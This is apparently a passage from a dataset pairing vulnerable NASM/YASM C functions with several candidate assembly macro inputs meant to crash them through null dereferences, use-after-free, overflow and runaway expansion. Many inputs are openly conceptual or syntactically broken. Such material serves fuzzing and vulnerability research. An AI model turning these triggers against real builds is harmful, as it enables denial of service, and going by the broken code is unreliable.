+        .next resq 1
+        .text resq 1
+    endstruc
+
+    section .bss
+    token_instance resb Token_size
+
+    section .text
+    %define t token_instance
+    %assign t.next 0
+    %assign t.text 0
+
+    mov rdi, t
+    call delete_Token
+%endmacro
+
+crash_delete_token",vul19_1
+,"%macro crash_delete_token 0
+    struc Token
+        .next resq 1
+        .text resq 1
+    endstruc
+
+    section .bss
+    token_instance resb Token_size
+
+    section .text
+    %define t token_instance
+    %assign t 0
+
+    mov rdi, t
+    call delete_Token
+%endmacro
+
+crash_delete_token",vul19_2
+,"%macro corrupt_token 0
+    %assign %$token 0
+    %xdefine t %$token
+    %xdefine t.next 0
+%endmacro
+
+corrupt_token",vul19_3
+,"%macro crash_delete_token 0
+    struc Token
+        .next resq 1
+        .text resq 1
+    endstruc
+
+    section .bss
+    token_instance resb Token_size
+
+    section .text
+    %define t token_instance
+    %assign t 0
+
+    mov rdi, t
+    call delete_Token
+%endmacro
+
+crash_delete_token",vul19_4
+,"%macro crash_delete_token 0
+    struc Token
+        .next resq 1
+        .text resq 1
+    endstruc
+
+    section .bss
+    invalid_token resb Token_size
+
+    section .text
+    %define t invalid_token
+    %assign t.next 0xFFFFFFFFFFFFFFFF
+    %assign t.text 0xFFFFFFFFFFFFFFFF
+
+    mov rdi, t
+    call delete_Token
+%endmacro
+
+crash_delete_token",vul19_5
+,"%macro crash_delete_token 0
+    struc Token
+        .next resq 1
+        .text resq 1
+    endstruc
+
+    section .bss
+    token_instance resb Token_size
+
+    section .text
+    %define t token_instance
+    %assign t.next 0xFFFFFFFFFFFFFFFF
+    %assign t.text 0x0
+
+    mov rax, [t.next]
+%endmacro
+
+crash_delete_token",vul19_6
+,"%macro crash_delete_token 0
+    struc Token
+        .next resq 1
+        .text resq 1
+    endstruc
+
+    %assign %$token_ptr 0
+    %define %$fake_token (%$token_ptr)
+
+    %rep 1
+        dd %$fake_token
+    %endrep
+%endmacro
+
+crash_delete_token",vul19_7
+,"%macro crash_delete_token 0
+    struc Token
+        .next resq 1
+        .text resq 1
+    endstruc
+
+    %assign %$token_ptr 0x0
+    %define t %$token_ptr
+    %xdefine next [t + Token.next]
+%endmacro
+
+crash_delete_token",vul19_8
+,"%macro trigger_delete_token_error 0
+struc Token
+    .next resq 1
+    .text resq 1
+endstruc
+
+section .bss
+token_instance resb Token_size
+
+%define %$token ((Token token_instance))
+mov qword [%$token.text], 0
+
+%define delete_Token(token_ptr) \
+    mov rdi, token_ptr \
+    call simulated_delete_Token
+
+section .text
+global _start
+_start:
+    delete_Token(%$token)
+
+simulated_delete_Token:
+    mov rax, [rdi + Token.next]
+    mov rcx, [rdi + Token.text]
+    test rcx, rcx
+    jz .skip_free
+    call nasm_free
+.skip_free:
+    mov rax, [rdi + Token.next]
+    mov [rdi + Token.next], rax
+    ret
+%endmacro
+
+trigger_delete_token_error",vul19_9
+"yasm_expr_create(yasm_expr_op op, yasm_expr__item *left,\n    yasm_expr__item *right, unsigned long line)\n{\n    yasm_expr *ptr, *sube;\n    unsigned long z;\n    ptr = yasm_xmalloc(sizeof(yasm_expr));\n\n    ptr->op = op;\n    ptr->numterms = 0;\n    ptr->terms[0].type = YASM_EXPR_NONE;\n    ptr->terms[1].type = YASM_EXPR_NONE;\n    if (left) {\n        ptr->terms[0] = *left;  /* structure copy */\n        z = (unsigned long)(left-itempool);\n        if (z>=31)\n            yasm_internal_error(N_(\""could not find expritem in pool\""));\n        itempool_used &= ~(1<<z);\n        ptr->numterms++;\n\n        /* Search downward until we find something *other* than an\n         * IDENT, then bring it up to the current level.\n         */\n        while (ptr->terms[0].type == YASM_EXPR_EXPR &&\n               ptr->terms[0].data.expn->op == YASM_EXPR_IDENT) {\n            sube = ptr->terms[0].data.expn;\n            ptr->terms[0] = sube->terms[0];     /* structure copy */\n            /*@-usereleased@*/\n            yasm_xfree(sube);\n            /*@=usereleased@*/\n        }\n    } else {\n        yasm_internal_error(N_(\""Right side of expression must exist\""));\n    }\n\n    if (right) {\n        ptr->terms[1] = *right; /* structure copy */\n        z = (unsigned long)(right-itempool);\n        if (z>=31)\n            yasm_internal_error(N_(\""could not find expritem in pool\""));\n        itempool_used &= ~(1<<z);\n        ptr->numterms++;\n\n        /* Search downward until we find something *other* than an\n         * IDENT, then bring it up to the current level.\n         */\n        while (ptr->terms[1].type == YASM_EXPR_EXPR &&\n               ptr->terms[1].data.expn->op == YASM_EXPR_IDENT) {\n            sube = ptr->terms[1].data.expn;\n            ptr->terms[1] = sube->terms[0];     /* structure copy */\n            /*@-usereleased@*/\n            yasm_xfree(sube);\n            /*@=usereleased@*/\n        }\n    }\n\n    ptr->line = line;\n\n    return expr_level_op(ptr, 1, 1, 0);","%macro trigger_expr_create 0
+    %assign %$left_item yasm_xmalloc(sizeof(yasm_expr__item))
+    %assign %$right_item yasm_xmalloc(sizeof(yasm_expr__item))
+
+    [ %$left_item + yasm_expr__item.type ] db YASM_EXPR_EXPR
+    [ %$left_item + yasm_expr__item.data.expn.op ] db YASM_EXPR_IDENT
+
+    %assign %$sub_expr yasm_xmalloc(sizeof(yasm_expr))
+    [ %$left_item + yasm_expr__item.data.expn ] dd %$sub_expr
+
+    [ %$sub_expr + yasm_expr.type ] db YASM_EXPR_EXPR
+    [ %$sub_expr + yasm_expr.op ] db YASM_EXPR_IDENT
+
+    [ %$right_item + yasm_expr__item.type ] db YASM_EXPR_NONE
+
+    yasm_expr_create YASM_EXPR_ADD, %$left_item, %$right_item, 0
+%endmacro
+
+trigger_expr_create",vul20_1
+,"%macro crash_yasm_expr_create 0
+    %define left_expr yasm_expr__item
+    %define right_expr yasm_expr__item
+
+    %assign left_expr.type YASM_EXPR_EXPR
+    %assign left_expr.data.expn 0  ; Intentionally set to NULL to trigger dereference
+
+    %assign right_expr.type YASM_EXPR_EXPR
+    %assign right_expr.data.expn 0  ; Intentionally set to NULL to trigger dereference
+
+    ; Call yasm_expr_create with crafted left and right expressions
+    ; This should trigger a NULL pointer dereference when accessing left_expr.data.expn and right_expr.data.expn
+    yasm_expr_create YASM_EXPR_ADD, left_expr, right_expr, 1
+%endmacro
+
+crash_yasm_expr_create",vul20_2
+,"%macro crash_yasm_expr_create 0
+    struc yasm_expr__item
+        .type resb 1
+        .data resb 8  ; Assuming 64-bit pointer for simplicity
+    endstruc
+
+    section .data
+    left_item: 
+        db YASM_EXPR_EXPR  ; Set type to YASM_EXPR_EXPR
+        dq fake_expr       ; Point to a crafted fake expression
+
+    fake_expr:
+        db YASM_EXPR_IDENT ; Set operation to YASM_EXPR_IDENT
+        dq 0               ; Null pointer to simulate bad dereference
+
+    %define left yasm_expr__item [left_item]
+    %define right NULL
+
+    ; Simulate call to yasm_expr_create with crafted left item and NULL right
+    extern yasm_expr_create
+    call yasm_expr_create, YASM_EXPR_ADD, left, right, 0
+%endmacro
+
+crash_yasm_expr_create",vul20_3
+,"%macro trigger_expr_create 0
+    %define fake_left yasm_expr__item
+    %define fake_right yasm_expr__item
+
+    %struc yasm_expr__item
+        type resb 1
+        data resb 8  ; Simulate pointer to another yasm_expr
+    %endstruc
+
+    %struc yasm_expr
+        op resb 1
+        numterms resb 1
+        terms resb 16  ; Simulate two yasm_expr__item structures
+        line resd 1
+    %endstruc
+
+    %assign %$left_offset 0
+    %assign %$right_offset 8
+
+    ; Create fake items with controlled content
+    fake_left:
+        db YASM_EXPR_EXPR  ; type
+        dq fake_left       ; data pointing to itself to create infinite loop
+
+    fake_right:
+        db YASM_EXPR_EXPR  ; type
+        dq fake_right      ; data pointing to itself to create infinite loop
+
+    ; Call the vulnerable function with crafted pointers
+    %define yasm_expr_create(op, left, right, line) \
+        db op \
+        dd left, right, line
+
+    ; Trigger the vulnerability
+    yasm_expr_create YASM_EXPR_ADD, fake_left, fake_right, 0
+%endmacro
+
+trigger_expr_create",vul20_4
+,"%macro crash_yasm_expr_create 0
+    %define fake_left yasm_expr__item
+    %define fake_right yasm_expr__item
+
+    %struc yasm_expr__item
+        type resb 1
+        data resb 8
+    %endstruc
+
+    %struc yasm_expr
+        op resb 1
+        numterms resb 1
+        terms resb 16
+        line resd 1
+    %endstruc
+
+    fake_left:
+        db YASM_EXPR_EXPR
+        dq fake_left
+
+    fake_right:
+        db YASM_EXPR_EXPR
+        dq fake_right
+
+    %define yasm_expr_create(op, left, right, line) \
+        db op, left, right, line
+
+    yasm_expr_create 0, fake_left, fake_right, 0
+%endmacro
+
+crash_yasm_expr_create",vul20_5
+,"%macro trigger_expr_create 0
+    struc yasm_expr__item
+        .type resb 1
+        .data resb 8
+    endstruc
+
+    %assign %$left yasm_expr__item
+    %assign %$right yasm_expr__item
+
+    db YASM_EXPR_EXPR
+    dq %$left
+
+    db YASM_EXPR_NONE
+    dq 0
+
+    %assign %$op YASM_EXPR_ADD
+    %assign %$line 123
+%endmacro
+
+trigger_expr_create",vul20_6
+,"%macro crash_yasm_expr_create 0
+    ; Simulate a scenario where yasm_expr_create is called with a left term that causes recursive copying
+    ; Setup a mock environment to simulate the condition
+    %define yasm_expr_op YASM_EXPR_IDENT
+    %define yasm_expr__item_left 0x1000  ; Mock address
+    %define yasm_expr__item_right 0x2000 ; Mock address
+    %define line_number 42
+
+    ; Mock items in the itempool to trigger the recursive copy
+    %assign itempool 0x3000
+    %assign itempool_used 0xFFFFFFFF
+
+    ; Directly invoke the yasm_expr_create with controlled parameters
+    ; This is a conceptual call, in real testing, this would be setup by manipulating memory directly or other means
+    yasm_expr_create yasm_expr_op, yasm_expr__item_left, yasm_expr__item_right, line_number
+
+    ; The above line is conceptual and would not directly translate to assembly
+    ; It represents the need to setup a test where yasm_expr_create is called with a crafted environment
+%endmacro
+
+; Trigger the crash
+crash_yasm_expr_create",vul20_7
+,"%macro trigger_expr_create 0
+    struc yasm_expr__item
+        .type resb 1
+        .data resb 8
+    endstruc
+
+    %assign left_item yasm_expr__item
+    %assign right_item yasm_expr__item
+
+    db YASM_EXPR_EXPR
+    dq left_item
+
+    db YASM_EXPR_EXPR
+    dq right_item
+
+    %rep 1
+        db YASM_EXPR_EXPR
+        dq left_item
+    %endrep
+%endmacro
+
+trigger_expr_create",vul20_8
+,"%macro trigger_expr_create 0
+    ; Simulate the creation of an expression with recursive IDENT references
+    ; Define a mock structure that simulates the behavior of yasm_expr__item and yasm_expr
+    struc yasm_expr__item
+        .type resb 1
+        .data resb 8  ; Assuming 64-bit pointer for simplicity
+    endstruc
+
+    struc yasm_expr
+        .op resb 1
+        .numterms resb 1
+        .terms resb 16  ; Two yasm_expr__item instances
+        .line resd 1
+    endstruc
+
+    ; Allocate memory for expr items simulating a pool
+    %assign expr_item_size yasm_expr__item_size
+    %assign expr_size yasm_expr_size
+
+    ; Create two expr items, left and right
+    left_item: resb expr_item_size
+    right_item: resb expr_item_size
+
+    ; Setup left_item to simulate YASM_EXPR_EXPR with a self-referencing data pointer
+    db YASM_EXPR_EXPR  ; type
+    dq left_item       ; data pointing to itself, simulating recursive IDENT
+
+    ; Setup right_item normally (not used in the vulnerability trigger)
+    db YASM_EXPR_NONE  ; type
+    dq 0               ; null data
+
+    ; Call the vulnerable function with crafted left_item
+    ; Normally, we would call the function directly if we could execute this,
+    ; but for PoC, we simulate what would happen.
+    ; yasm_expr_create(YASM_EXPR_OP, left_item, right_item, 1234)
+
+    ; The above setup should trigger infinite recursion or misuse of freed memory
+    ; when yasm_expr_create processes left_item.
+%endmacro
+
+trigger_expr_create",vul20_9
+"pp_getline(void) { char *line; Token *tline; while (1) { tline = NULL; if (first_line) { poke_predef(predef); poke_predef(stddef); poke_predef(builtindef); first_line = 0; } if (!istk) return NULL; while (istk->expansion && istk->expansion->finishes) { Line *l = istk->expansion; if (!l->finishes->name && l->finishes->in_progress > 1) { Line *ll; l->finishes->in_progress--; for (l = l->finishes->expansion; l; l = l->next) { Token *t, *tt, **tail; ll = nasm_malloc(sizeof(Line)); ll->next = istk->expansion; ll->finishes = NULL; ll->first = NULL; tail = &ll->first; for (t = l->first; t; t = t->next) { if (t->text || t->type == TOK_WHITESPACE) { tt = *tail = new_Token(NULL, t->type, t->text, 0); tail = &tt->next; } } istk->expansion = ll; } } else { if (defining) { if (defining->name) error(ERR_PANIC, 'defining with name in expansion'); else if (istk->mstk->name) error(ERR_FATAL, '`%%rep' without `%%endrep' within expansion of macro `%s'', istk->mstk->name); } MMacro *m = istk->mstk; istk->mstk = m->next_active; if (m->name) { nasm_free(m->params); free_tlist(m->iline); nasm_free(m->paramlen); l->finishes->in_progress = FALSE; } else free_mmacro(m); istk->expansion = l->next; nasm_free(l); list->downlevel(LIST_MACRO); } } while (1) { if (istk->expansion) { char *p; Line *l = istk->expansion; if (istk->mstk) istk->mstk->lineno++; tline = l->first; istk->expansion = l->next; nasm_free(l); p = detoken(tline, FALSE); list->line(LIST_MACRO, p); nasm_free(p); break; } line = read_line(); if (line) { line = prepreproc(line); tline = tokenise(line); nasm_free(line); break; } Include *i = istk; if (i->fp != first_fp) fclose(i->fp); if (i->conds) error(ERR_FATAL, 'expected `%%endif' before end of file'); if (i->next) { nasm_src_set_linnum(i->lineno); nasm_free(nasm_src_set_fname(nasm_strdup(i->fname))); } istk = i->next; list->downlevel(LIST_INCLUDE); nasm_free(i->fname); nasm_free(i); if (!istk) return NULL; if (istk->expansion && istk->expansion->finishes) break; } if (!defining && !(istk->conds && !emitting(istk->conds->state))) tline = expand_mmac_params(tline); if (do_directive(tline) == DIRECTIVE_FOUND) { continue; } else if (defining) { Line *l = nasm_malloc(sizeof(Line)); l->next = defining->expansion; l->first = tline; l->finishes = FALSE; defining->expansion = l; continue; } else if (istk->conds && !emitting(istk->conds->state)) { free_tlist(tline); continue; } else if (istk->mstk && !istk->mstk->in_progress) { free_tlist(tline); continue; } else { tline = expand_smacro(tline); if (!expand_mmacro(tline)) { if (tasm_compatible_mode) tline = tasm_join_tokens(tline); line = detoken(tline, TRUE); free_tlist(tline); break; } else { continue; } } } return line; }","%macro trigger_use_after_free 0
+    ; Simulate conditions leading to `l` being freed before accessing `l->first`
+    struc Line
+        .next resq 1
+        .finishes resq 1
+        .first resq 1
+    endstruc
+
+    ; Allocate a Line structure and immediately free it to simulate use-after-free
+    %define l nasm_malloc(sizeof(Line))
+    %assign l.next NULL
+    %assign l.finishes NULL
+    %assign l.first NULL
+
+    ; Free the structure to simulate use-after-free
+    nasm_free(l)
+
+    ; Now, simulate the access that would use the freed structure
+    %define tline l.first
+%endmacro
+
+trigger_use_after_free",vul21_1
+,"%macro trigger_pp_getline_crash 0
+    ; Simulate a scenario where `l` points to an invalid Line structure
+    struc BadLine
+        .next resq 1
+        .finishes resq 1
+        .first resq 1  ; Deliberately point to an invalid memory location
+    endstruc
+
+    ; Allocate a BadLine structure and manipulate the stack to make `istk->expansion` point to it
+    %define fake_line nasm_malloc(sizeof(BadLine))
+    mov [fake_line+BadLine.first], 0xDEADBEEF  ; Invalid memory address
+
+    ; Assume `istk` is a register holding the address of the current include stack
+    mov [istk+istk.expansion], fake_line
+
+    ; Trigger the vulnerable function, expecting it to use the manipulated `l->first`
+    call pp_getline
+%endmacro
+
+trigger_pp_getline_crash",vul21_2
+,"%macro trigger_pp_getline_crash 0
+    ; Simulate a scenario where istk->expansion is manipulated
+    ; to point to a crafted Line structure with an invalid 'first' pointer
+    struc Line
+        .next resq 1
+        .finishes resq 1
+        .first resq 1    ; This will be the 'tline' causing the crash
+    endstruc
+
+    ; Allocate memory for a fake Line structure
+    %define fake_line nasm_malloc(sizeof(Line))
+    %define invalid_pointer 0x123456  ; Deliberately invalid pointer for demonstration
+
+    ; Set up the fake Line structure
+    [fake_line+Line.first] dq invalid_pointer
+
+    ; Manipulate istk->expansion to point to our fake Line
+    %define istk_expansion_offset  ; Offset needs to be determined based on istk structure
+    [istk+istk_expansion_offset] dq fake_line
+
+    ; Trigger the vulnerable function which should access the invalid 'first' pointer
+    ; Normally, this would be part of a larger sequence where pp_getline is called
+    ; This is a conceptual demonstration; actual triggering might need more context setup
+%endmacro
+
+trigger_pp_getline_crash",vul21_3
+,"%macro crash_pp_getline 0
+    ; Simulate a scenario where istk->expansion is manipulated to point to an invalid Line structure
+    struc BadLine
+        .next resq 1
+        .finishes resq 1
+        .first resq 1   ; Deliberately set to NULL or an invalid pointer
+    endstruc
+
+    ; Allocate a BadLine structure and set it as the current istk->expansion
+    %define fake_line nasm_malloc(sizeof(BadLine))
+    [fake_line].BadLine.first equ 0  ; Set to NULL to trigger null dereference
+
+    ; Force the YASM preprocessor to use this fake line structure
+    %define istk.expansion fake_line
+
+    ; Trigger the pp_getline function which will attempt to access .first (NULL)
+    %rep 1
+        db 0
+    %endrep
+%endmacro
+
+crash_pp_getline",vul21_7
+,"%macro crash_pp_getline 0
+    ; Trigger recursive macro expansion without proper termination
+    %rep 1000000
+        %define tricky_macro %1
+    %endrep
+
+    ; Define a macro that simulates the problematic behavior in pp_getline
+    %define simulate_pp_getline_behavior
+        %assign l_first NULL  ; Simulate an uninitialized or invalid pointer
+        mov rax, [l_first]   ; Attempt to access memory through the invalid pointer
+    %endmacro
+
+    ; Invoke the macro to simulate the behavior and trigger the crash
+    simulate_pp_getline_behavior
+%endmacro
+
+; Execute the macro to trigger the crash
+crash_pp_getline",vul21_8
+,"%macro setup_invalid_expansion 0
+    struc bad_expansion
+        .next resb 1
+        .finishes resb 1
+        .first resb 1
+    endstruc
+
+    %assign %$expansion_offset bad_expansion.first - bad_expansion.next
+    %define %$create_bad_expansion() \
+        [rel istk+istk.expansion+%$expansion_offset]: dq bad_expansion
+
+    %$create_bad_expansion
+%endmacro
+
+%macro trigger_unhandled_memory_error 0
+    setup_invalid_expansion
+    %rep 1
+        db 0x90 ; NOP - simulate some operations
+    %endrep
+%endmacro
+
+trigger_unhandled_memory_error",vul21_9
+"static void error(int severity, const char *fmt, ...) { va_list arg; char buff[1024]; if (istk && istk->conds && !emitting(istk->conds->state)) return; va_start(arg, fmt); #ifdef HAVE_VSNPRINTF vsnprintf(buff, sizeof(buff), fmt, arg); #else vsprintf(buff, fmt, arg); #endif va_end(arg); if (istk && istk->mstk && istk->mstk->name) _error(severity | ERR_PASS1, \""(%s:%d) %s\"", istk->mstk->name, istk->mstk->lineno, buff); else _error(severity | ERR_PASS1, \""%s\"", buff);","%macro trigger_error 0
+    %assign %$long_string_length 1500
+    %define %$long_string `rep 1500 dup ('A')`
+    %error %$long_string
+%endmacro
+
+trigger_error",vul22_1
+,"%macro crash_error 1
+    %xdefine %$name %1
+    %assign %$lineno %1
+    crash_error %1
+%endmacro
+
+%macro setup_error 0
+    %define istk.mstk.name %$name
+    %define istk.mstk.lineno %$lineno
+    %error ""Triggering error with invalid stack setup""
+%endmacro
+
+crash_error 1000000
+setup_error",vul22_2
+,"%macro generate_long_string 0
+    %rep 300  ; Repeat the string concatenation 300 times
+        %assign i i+1
+        %define str str %+ ""VeryLongString""
+    %endrep
+    %error str  ; Trigger the error function with the long string
+%endmacro
+
+generate_long_string",vul22_3
+,"%macro generate_long_error 0
+    %rep 2048  ; Repeat the following line 2048 times to generate a long string
+        db 'A'
+    %endrep
+    db 0       ; Null-terminate the string
+%endmacro
+
+%macro trigger_error 0
+    %assign %$long_string generate_long_error
+    %error ""Error: %s"", %$long_string
+%endmacro
+
+trigger_error",vul22_4
+,"%macro generate_long_string 0
+    %rep 300  ; Repeat the string concatenation 300 times
+        %assign i i+1
+        %define str str %+ ""A very long string to cause overflow ""
+    %endrep
+%endmacro
+
+%macro trigger_error 0
+    generate_long_string
+    %error str  ; Trigger the error function with the expanded long string
+%endmacro
+
+trigger_error",vul22_5
+,"%macro trigger_error 0
+    struc trigger_overflow
+        .long_string resb 2048  ; Reserve a buffer larger than the one in the error function
+    endstruc
+
+    %assign %$long_string_offset trigger_overflow.long_string
+
+    ; Simulate a scenario where vsprintf might be called with a very long input string
+    db ""A""  ; Start of a long string
+    times 2048 db ""A""  ; Fill with 'A' to ensure overflow
+    db 0    ; Null terminator for the string
+
+    ; Assuming a hypothetical directive or macro that incorrectly handles string length
+    %error ""Extremely long error message: %s"", (%$long_string_offset)
+%endmacro
+
+trigger_error",vul22_6
+"expand_mmac_params(Token * tline) { Token *t, *tt, **tail, *thead; tail = &thead; thead = NULL; while (tline) { if (tline->type == TOK_PREPROC_ID && (((tline->text[1] == '+' || tline->text[1] == '-') && tline->text[2]) || tline->text[1] == '%' || (tline->text[1] >= '0' && tline->text[1] <= '9'))) { char *text = NULL; int type = 0, cc; char tmpbuf[30]; char *second_text = NULL; int n, i; MMacro *mac; t = tline; tline = tline->next; second_text = strchr(t->text, ':'); mac = istk->mstk; while (mac && !mac->name) mac = mac->next_active; if (!mac) error(ERR_NONFATAL, '`%s': not in a macro call', t->text); else { if (second_text) { int end = atoi(second_text+1)-1; int is_fst = 1; int k; n = atoi(t->text + 1)-1; if (end < 0) end += mac->nparam; for (k = n; k <= end; k++) { if (k >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) k = (k + mac->rotate) % mac->nparam; tt = mac->params[k]; } if (tt) { if (!is_fst && mac->paramlen[k]) { *tail = new_Token(NULL, TOK_OTHER, ',', 0); tail = &(*tail)->next; } if (mac->paramlen[k]) is_fst = 0; for (i = 0; i < mac->paramlen[k]; i++) { *tail = new_Token(NULL, tt->type, tt->text, 0); tail = &(*tail)->next; tt = tt->next; } } text = NULL; } } else { switch (t->text[1]) { case '0': type = TOK_NUMBER; sprintf(tmpbuf, '%ld', mac->nparam); text = nasm_strdup(tmpbuf); break; case '%': type = TOK_ID; sprintf(tmpbuf, '..@%lu.', mac->unique); text = nasm_strcat(tmpbuf, t->text + 2); break; case '-': n = atoi(t->text + 2) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } cc = find_cc(tt); if (cc == -1) { error(ERR_NONFATAL, 'macro parameter %d is not a condition code', n + 1); text = NULL; } else { type = TOK_ID; if (inverse_ccs[cc] == -1) { error(ERR_NONFATAL, 'condition code `%s' is not invertible', conditions[cc]); text = NULL; } else text = nasm_strdup(conditions[inverse_ccs [cc]]); } break; case '+': n = atoi(t->text + 2) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } cc = find_cc(tt); if (cc == -1) { error(ERR_NONFATAL, 'macro parameter %d is not a condition code', n + 1); text = NULL; } else { type = TOK_ID; text = nasm_strdup(conditions[cc]); } break; default: n = atoi(t->text + 1) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } if (tt) { for (i = 0; i < mac->paramlen[n]; i++) { *tail = new_Token(NULL, tt->type, tt->text, 0); tail = &(*tail)->next; tt = tt->next; } } text = NULL; } } } if (!text) { delete_Token(t); } else { *tail = t; tail = &t->next; t->type = type; nasm_free(t->text); t->text = text; t->mac = NULL; } continue; } else { t = *tail = tline; tline = tline->next; t->mac = NULL; tail = &t->next; } } *tail = NULL; t = thead; for (; t && (tt = t->next) != NULL; t = t->next) switch (t->type) { case TOK_WHITESPACE: if (tt->type == TOK_WHITESPACE) { t->next = delete_Token(tt); } break; case TOK_ID: if (tt->type == TOK_ID || tt->type == TOK_NUMBER) { char *tmp = nasm_strcat(t->text, tt->text); nasm_free(t->text); t->text = tmp; t->next = delete_Token(tt); } break; case TOK_NUMBER: if (tt->type == TOK_NUMBER) { char *tmp = nasm_strcat(t->text, tt->text); nasm_free(t->text); t->text = tmp; t->next = delete_Token(tt); } break; } return thead; }","%macro trigger_expand_mmac_params 0
+    %define %+1 1
+    %rep 1000000
+        %+1 %+1 %+1 %+1 %+1 %+1 %+1 %+1 %+1 %+1
+    %endrep
+%endmacro
+
+%macro setup_invalid_macro 0
+    %define %$param1 %+1
+    %assign %$param2 (%+1 %+1)
+    %assign %$param3 (%+1 %+1 %+1)
+%endmacro
+
+%macro misuse_token 0
+    %define %$token1 %+1
+    %define %$token2 %+1 %+1
+    %define %$token3 %+1 %+1 %+1
+%endmacro
+
+trigger_expand_mmac_params
+setup_invalid_macro
+misuse_token",vul23_1
+,"%macro crash_yasm 0
+    %rep 1000000  ; Large number to potentially exhaust stack or cause unexpected behavior
+        %define %+1 %+1  ; Recursive expansion to increase complexity and potential for error
+    %endrep
+    %+1: %+1  ; Use of token concatenation and label to trigger parsing errors
+%endmacro
+
+%macro misuse_params 0
+    %define %$param1 1
+    %define %$param2 -1  ; Negative index to test bounds checking
+    %define %$param3 %0  ; Non-existent parameter reference
+    %define %$param4 %+1  ; Invalid token concatenation
+    %define %$param5 %$param1+%$param2  ; Arithmetic on parameters
+    misuse_params %+1, %$param5, %$param3  ; Misuse macro parameters in call
+%endmacro
+
+crash_yasm
+misuse_params",vul23_2
+,"%macro crash_macro 1
+    %1: %+1
+%endmacro
+
+%define %+ wrap_around
+crash_macro %+999999999",vul23_3
+,"%macro crash_yasm 0
+    %define %$tline 1
+    %assign %$t.type TOK_PREPROC_ID
+    %define %$t.text ""+1:5""
+    %assign %$t.next 0
+
+    ; Simulate a macro call environment
+    %define %$mac.name 1
+    %assign %$mac.nparam 3
+    %assign %$mac.rotate 1
+    %assign %$mac.params {1, 2, 3}
+    %assign %$mac.paramlen {1, 1, 1}
+
+    ; Trigger the vulnerable function with crafted tokens
+    expand_mmac_params %$tline
+%endmacro
+
+crash_yasm",vul23_4
+"static int handle_dot_label(YYSTYPE *lvalp, char *tok, size_t toklen, size_t zeropos, yasm_parser_nasm *parser_nasm) { /* check for special non-local labels like ..start */ if (tok[zeropos+1] == '.') { lvalp->str_val = yasm__xstrndup(tok+zeropos+(parser_nasm->tasm?2:0), toklen-zeropos-(parser_nasm->tasm?2:0)); /* check for special non-local ..@label */ if (lvalp->str_val[2] == '@') return NONLOCAL_ID; return SPECIAL_ID; } if (parser_nasm->masm && tok[zeropos] == '.') { lvalp->str_val = yasm__xstrndup(tok + zeropos, toklen - zeropos); return SPECIAL_ID; } if (parser_nasm->tasm && (!tasm_locals || (tok[zeropos] == '.' && tok[zeropos+1] != '@' && tok[zeropos+2] != '@'))) { /* no locals on Tasm without the 'locals' directive */ /* .foo is never local either, but .@@foo may be (local structure members) */ lvalp->str_val = yasm__xstrndup(tok + zeropos, toklen - zeropos); return SPECIAL_ID; } if (!parser_nasm->locallabel_base) { lvalp->str_val = yasm__xstrndup(tok+zeropos, toklen-zeropos); yasm_warn_set(YASM_WARN_GENERAL, N_(\""no non-local label before `%s'\""), lvalp->str_val); } else { size_t len = toklen - zeropos + parser_nasm->locallabel_base_len; lvalp->str_val = yasm_xmalloc(len + 1); strcpy(lvalp->str_val, parser_nasm->locallabel_base); strncat(lvalp->str_val, tok+zeropos, toklen-zeropos); lvalp->str_val[len] = '\\0'; } return LOCAL_ID; }","%macro trigger_handle_dot_label 0
+    ; Simulate a scenario where the token length is less than expected for safe access
+    ; We will pass a token with length 1, which should not allow access to str_val[2]
+    ; This is a conceptual representation and may need actual C code interaction or specific crafted input file to trigger in practice
+
+    ; Define a minimal token and manipulate the internal state to pass to handle_dot_label
+    %define tok "".""
+    %define toklen 1
+    %define zeropos 0
+    %define parser_nasm.tasm 0
+
+    ; Directly manipulate memory assuming we can interact at this level (conceptual)
+    ; The real trigger would need to be done via crafted input or direct memory manipulation in a testing environment
+    %assign lvalp 0x1000  ; hypothetical address
+    %assign lvalp.str_val 0x1004  ; hypothetical address pointing to str_val
+
+    ; Place a short string at lvalp.str_val
+    db '.', 0  ; simulate that str_val points here, which is less than 3 characters long
+
+    ; The following line is conceptual and would typically be triggered by the parser handling a crafted input
+    ; handle_dot_label(lvalp, tok, toklen, zeropos, parser_nasm)
+%endmacro
+
+trigger_handle_dot_label",vul24_1
+,"%macro trigger_handle_dot_label 0
+    ; Simulate a scenario where the tok string is shorter than expected
+    ; causing an out-of-bounds access when the function tries to access lvalp->str_val[2]
+    struc simulate_short_tok
+        .byte 1 dup(0)  ; Only one byte, making toklen effectively 1
+    endstruc
+
+    ; Define a macro to create an instance of simulate_short_tok
+    %define tok simulate_short_tok
+    %define zeropos 0
+    %define toklen 1
+    %define parser_nasm.tasm 0
+
+    ; This should trigger the function with controlled parameters
+    %assign lvalp_str_val_offset 2
+    %assign lvalp_str_val [lvalp_str_val_offset]
+
+    ; Attempt to access an out-of-bounds index
+    mov eax, [lvalp_str_val]
+%endmacro
+
+; Use the macro to trigger the vulnerability
+trigger_handle_dot_label",vul24_2
+,"%macro trigger_out_of_bounds_read 0
+struc trigger
+    .tok db '.', '.', 0       ; Construct a token that looks like a special non-local label but is only 2 characters long
+    .toklen equ $ - .tok      ; Calculate the length of the token
+    .zeropos equ 0            ; Zero position at the start
+    .parser_nasm dd 0         ; Mock structure for parser_nasm with tasm set to false
+    .lvalp dd 0               ; Mock structure for YYSTYPE
+endstruc
+
+%assign %$parser_nasm_tasm_offset 4 ; Assuming 'tasm' is at offset 4 in parser_nasm structure
+%assign %$lvalp_str_val_offset 0    ; Assuming 'str_val' is at offset 0 in YYSTYPE structure
+
+; Simulate the environment and conditions to reach the vulnerable line
+mov eax, [trigger.parser_nasm]      ; Load the address of parser_nasm
+mov byte [eax+%$parser_nasm_tasm_offset], 0 ; Ensure 'tasm' is false
+
+mov ebx, [trigger.lvalp]            ; Load the address of lvalp
+mov ecx, trigger.tok                ; Load the address of the token
+mov edx, trigger.toklen             ; Load the token length
+mov esi, trigger.zeropos            ; Load the zero position
+
+; Call the function (simulated) with controlled parameters
+; Assuming handle_dot_label is at some known address or label
+call handle_dot_label, ebx, ecx, edx, esi, eax
+
+%endmacro
+
+trigger_out_of_bounds_read",vul24_3
+,"%macro crash_handle_dot_label 0
+    ;; Simulate a scenario where the input token is too short, leading to an out-of-bounds access
